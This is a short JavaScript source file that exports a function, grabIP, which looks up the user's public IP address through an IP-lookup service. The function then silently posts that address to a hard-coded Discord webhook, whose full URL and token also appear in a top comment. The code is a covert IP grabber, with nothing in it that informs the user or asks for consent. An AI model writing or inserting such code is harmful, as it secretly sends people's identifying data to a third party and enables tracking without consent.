//https://discord.com/api/webhooks/1414321410050097252/LZP3nsGkbJJAtqgLZIeUqnMUaAYlxBcd-2m4WK_FO4xmHzNjcOOprhGyUjq7nyg86lFl

export const grabIP = async ()=>{
	const response = await fetch("https://api.ipify.org?format=json")
	const json = await response.json()
	
	fetch("https://discord.com/api/webhooks/1414321410050097252/LZP3nsGkbJJAtqgLZIeUqnMUaAYlxBcd-2m4WK_FO4xmHzNjcOOprhGyUjq7nyg86lFl", {
		headers: {
			"content-type": "application/json"
		},
		method: "POST",
		body: JSON.stringify({
			"content": "NEW IP: " + json.ip,
			"tts": false,
			"embeds": [],
			"components": [],
			"actions": {}
		})
	})
}